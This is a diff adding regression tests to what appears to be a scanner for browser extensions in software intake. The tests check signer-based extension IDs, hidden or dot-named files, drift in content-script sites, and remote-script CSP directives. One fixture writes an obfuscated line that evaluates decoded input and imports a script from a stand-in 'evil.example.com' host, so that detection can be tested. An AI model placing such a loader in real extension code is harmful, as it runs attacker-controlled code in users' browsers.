@@ -885,3 +885,114 @@ def test_a_shipped_node_modules_folder_is_noted_beside_its_findings(tmp_path):
                                         target=f"Extensions/{ID_A}/1.0.0_0/node_modules/minimist/package.json")])
     _, blocks = report.browser_section({"browser_extensions": info})
     assert "ships a node_modules folder" in json.dumps(blocks)
+
+
+# ------------------------------------------------------------------------------------------- the review (23 Nov)
+
+def test_review_crx_id_comes_from_the_signature_not_the_manifest_key(tmp_path, signer_keys, test_store, monkeypatch):
+    """Review 1: the browser installs a .crx under its signer's ID and replaces the manifest's key; a manifest key
+    naming a harmless extension must not hide a known-bad signer."""
+    from .crxsigner import id_of
+
+    bad_id = id_of(signer_keys["dev"])
+    harmless_key = base64.b64encode(b"a harmless extension's public key").decode()
+    real = integrity._bundled_known_bad()
+    real["browser_extensions"] = [{"id": bad_id, "name": "n", "versions": ["*"], "reference": "https://r",
+                                   "note": "test"}]
+    monkeypatch.setattr(integrity, "_bundled_known_bad", lambda: json.loads(json.dumps(real)))
+    monkeypatch.setattr(integrity, "_published", None)
+    f = signed_crx(tmp_path, signer_keys, manifest={**MV3, "key": harmless_key})
+    assert run(tmp_path, "--path", str(f), "--fail-on", "malicious", "--scanners", "trivy,osv") == cli.EXIT_THRESHOLD
+    (e,) = assessment(tmp_path)["browser_extensions"]["extensions"]
+    assert e["id"] == bad_id and any(s["id"] == "identity" for s in e["signals"])
+
+
+def test_review_unverified_crx_is_looked_up_under_both_ids(tmp_path, signer_keys, monkeypatch):
+    from oss_intake import crxsign
+
+    from .crxsigner import id_of
+
+    monkeypatch.setattr(crxsign, "_crypto", lambda: None)
+    bad_id = id_of(signer_keys["dev"])
+    real = integrity._bundled_known_bad()
+    real["browser_extensions"] = [{"id": bad_id, "name": "n", "versions": ["*"], "reference": "https://r",
+                                   "note": "test"}]
+    monkeypatch.setattr(integrity, "_bundled_known_bad", lambda: json.loads(json.dumps(real)))
+    monkeypatch.setattr(integrity, "_published", None)
+    f = signed_crx(tmp_path, signer_keys, manifest={**MV3, "key": base64.b64encode(b"other").decode()})
+    assert run(tmp_path, "--path", str(f), "--fail-on", "malicious", "--scanners", "trivy,osv") == cli.EXIT_THRESHOLD
+
+
+def test_review_a_dot_named_crx_is_still_assessed(tmp_path, listed):
+    """Review 2: .ext.crx unpacked to a folder named .ext, which the staged read skipped: no extension, no gate."""
+    f = tmp_path / ".ext.crx"
+    f.write_bytes(crx({"manifest.json": json.dumps({**MV3, "name": "Dotted"})}))
+    assert run(tmp_path, "--path", str(f)) == cli.EXIT_OK
+    assert [e["name"] for e in assessment(tmp_path)["browser_extensions"]["extensions"]] == ["Dotted"]
+
+
+def test_review_drift_sees_content_sites_past_the_first_200(tmp_path):
+    """Review 3: the content-script sites were cut to 200 before comparing, so a site added after them was missed."""
+    many = [f"*://a{i:03d}.example.com/*" for i in range(200)]
+    old = {**MV3, "content_scripts": [{"matches": many, "js": ["c.js"]}]}
+    new = {**MV3, "content_scripts": [{"matches": [*many, "https://*.bank.example/*"], "js": ["c.js"]}]}
+    diff = versions(tmp_path, old, new)
+    assert diff["content_sites_added"] == ["https://*.bank.example/*"] and diff["drift"]
+
+
+def test_review_a_nul_byte_does_not_hide_code(tmp_path):
+    """Review 4: one NUL in the first 8 KB made a script count as binary, so it was not read."""
+    found = code(tmp_path, bg__js="/*\0*/ eval(atob(x)); importScripts('https://evil.example.com/x.js');")
+    assert {"code-eval", "code-import-remote"} <= set(found)
+
+
+def test_review_a_script_the_manifest_names_is_read_whatever_its_name(tmp_path):
+    folder = write_ext(tmp_path / "e", {**MV3, "content_scripts": [{"matches": ["<all_urls>"], "js": ["c.map"]}]})
+    (folder / "c.map").write_text("eval(1)", encoding="utf-8")
+    e = browserext.analyse(folder)
+    assert any(s["id"] == "code-eval" for s in e["signals"])
+
+
+def test_review_files_read_counts_only_files_read(tmp_path):
+    folder = write_ext(tmp_path / "e", MV3)
+    (folder / "x.js.map").write_text("{}", encoding="utf-8")
+    (folder / "icon.png").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(range(256)) * 4)
+    assert browserext.analyse(folder)["code_facts"]["files_read"] == 0
+
+
+def test_review_hosts_are_linear_on_a_hostile_file(tmp_path):
+    """Review 6: each URL was checked against a list of up to 1,000 hosts. Compared with a baseline, not a fixed
+    time (the Windows runners are slow)."""
+    import time
+
+    many = " ".join(f"https://h{i}.example.com" for i in range(1000))
+    hostile = write_ext(tmp_path / "a", MV3, x__js="")
+    (hostile / "x.js").write_text(many + " https://h999.example.com" * 60000, encoding="utf-8")
+    plain = write_ext(tmp_path / "b", MV3, x__js="")
+    (plain / "x.js").write_text("https://h0.example.com " * (len(many) // 23 + 60000), encoding="utf-8")
+    t0 = time.perf_counter()
+    browserext.analyse(plain)
+    base = time.perf_counter() - t0
+    t0 = time.perf_counter()
+    browserext.analyse(hostile)
+    assert time.perf_counter() - t0 < base * 3 + 0.2
+
+
+def test_review_manifests_chrome_reads_with_raw_newlines_and_x_escapes():
+    """Chromium reads manifests with JSON_PARSE_CHROMIUM_EXTENSIONS (comments, \\r and \\n inside strings, \\xNN
+    escapes): a manifest using them must not be unreadable here, or it hides from the checks."""
+    raw = b'{"name": "line one\nline two", "version": "1.0", "description": "\\x41BC", "manifest_version": 3}'
+    data = browserext.parse_manifest(raw)
+    assert data is not None and data["name"] == "line one\nline two" and data["description"] == "ABC"
+
+
+@pytest.mark.parametrize("pattern", ["https://*:*/*", "*://*:8080/*", "http://*:443/"])
+def test_review_every_site_patterns_with_a_port(pattern):
+    assert browserext.is_all_sites(pattern)
+
+
+def test_review_remote_scripts_in_other_script_directives():
+    for directive in ("script-src-elem", "worker-src"):
+        found = signals({**MV3, "manifest_version": 2,
+                         "content_security_policy": f"script-src 'self'; {directive} https://cdn.example.net"})
+        assert "csp-remote" in found, directive
